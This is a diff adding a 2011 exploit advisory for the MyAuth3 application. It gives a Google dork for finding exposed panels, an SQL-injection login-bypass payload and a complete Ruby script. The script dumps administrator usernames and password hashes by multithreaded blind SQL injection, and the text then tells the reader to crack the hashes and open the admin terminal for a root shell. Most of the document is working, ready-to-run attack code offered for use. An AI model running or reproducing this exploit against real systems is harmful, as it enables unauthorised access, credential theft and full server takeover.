@@ -1,0 +1,136 @@
+# Exploit Title: MyAuth3 Blind SQL Injection / Root Shell Access 0day exploit
+# Google Dork: allinurl:1881/?console=panel
+# Date: 09/06/2011
+# Author: Marcio Almeida (marcio[at]alligatorteam[dot]
+org | @marcioalm)
+# Version: 3.0
+# Tested on: Linux
+ 
+#EDB-Note: apparently no true exploit is needed to dump system pwd hashes, because the admin myauth users have the ability to run a terminal session
+ 
+---------------
+PoC (POST data)
+---------------
+URL:
+http://localhost:1881/index.php?console=panel
+  
+POST Data (Authentication bypass):
+panel_cmd=auth&r=ok&user=alligatorteam&pass=' or 1=1#
+---------------
+ 
+This application has a accessible root shell in the admin interface located at:
+ 
+http://localhost:1881/admin/
+ 
+When you access it, just go to tools / terminal menu and g0t r00t!
+ 
+The following code will manage all the dirty work for you!
+ 
+enjoy ;-)
+ 
+############## EXPLOIT CODE [myauth3_xpl.rb] ##################
+ 
+require "net/http"
+require "net/https"
+require "erb"
+require "singleton"
+require 'uri'
+ 
+sql = "select concat(user,0x20,pass) from admusers where enable = 1 and accesslevel >= 20"
+@target = ARGV[0]
+numthreads = ARGV[1]
+@verbose = ARGV[2]
+@cookie = ""
+ 
+    puts "+=============================================================================+"
+    puts "| MyAuth 3 - Blind SQL Injection / Root Shell Access 0day exploit             |"
+    puts "| Google Dork: allinurl:1881/?console=panel                                   |"
+    puts "| author: Marcio Almeida (marcio@alligatorteam.org)                           |"
+    puts "|                                                                                 |"
+    puts "|       by Alligator Security Team  | irc://irc.freenode.net:8001/#Alligator  |"
+    puts "|                                     twitter: @alligatorteam                 |"
+    puts "+=============================================================================+"
+    puts
+if (ARGV[0].nil? || ARGV[1].nil?)
+ 
+    puts "usage (non verbose): ruby -W0 #{__FILE__} address num_threads"
+    puts "usage (verbose): ruby -W0 #{__FILE__} address num_threads -v"
+    puts "-----------------------------------------------------------"
+    puts "Example 1: ruby -W0 #{__FILE__} 127.0.0.1 5"
+    puts "Example 2: ruby -W0 #{__FILE__} www.vulnsite.com.br 5 -v"
+    exit(0)
+end
+    
+def requisicao(posicao,p_substr,sql)
+    useragent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1'
+    @http = Net::HTTP.new(@target, 1881)
+ #     @http.use_ssl = true
+    parametro = "panel_cmd=auth&r=ok&user=alligatorteam&pass=' or #{posicao} >= ascii(substr((#{sql}),#{p_substr.to_s},1))#"
+    begin
+    resp, data = @http.post2("/index.php?console=panel", parametro, {'User-Agent' => useragent, 'Cookie' => @cookie.to_s })
+     resultado = data.match(/Financeiro/)
+    rescue Exception=>e
+    puts e
+    end
+    if resultado.nil?
+        return false
+    else
+        return true
+    end
+end
+ 
+def busca_r( menor, maior, p_substr,sql )
+   return -1 if menor > maior
+   return maior if (maior-menor)==1
+   posicao = (menor+maior)/2 
+   if (requisicao(posicao,p_substr,sql))
+     busca_r( menor, posicao, p_substr,sql )
+   else
+     busca_r( posicao, maior,p_substr,sql )
+   end
+end
+ 
+def busca_sql(inicio, qtdThreads, sql, str_final)
+    resultado = 0
+    while (resultado != 1) do
+    str_final[inicio] = ""
+      resultado = busca_r(0,255,inicio,sql)
+      if resultado != 1
+          if @verbose == "-v"
+        puts inicio.to_s+") Character Found: "+resultado.to_s+" - "+resultado.chr.to_s
+        end
+        str_final[inicio] += resultado.chr.to_s
+        inicio = inicio + qtdThreads.to_i
+      end
+    end
+end
+ 
+def busca_com_threads(sql, numthreads)
+str_final = []
+ 
+threads = []
+count = 1
+numthreads.to_i.times{|i|
+   threads << Thread.new {
+        busca_sql(count, numthreads, sql, str_final)
+    }
+   count += 1
+}
+ 
+threads.each do |t|
+    t.join
+end
+ 
+   puts str_final.to_s
+ 
+end
+ 
+puts "When you crack any of the following hashes, go to http://"+ @target + ":1881/admin to login into the application."
+puts "Then go to tools / terminal menu and get a r00t shell access ;-)"
+puts "=========================================================================="
+puts "[+] admusers table dumping... (maybe it'll take a little bit of time...)"
+puts "=========================================================================="
+ 
+100.times { |i|
+  busca_com_threads(sql+" limit 1 offset " + i.to_s, numthreads)
+}
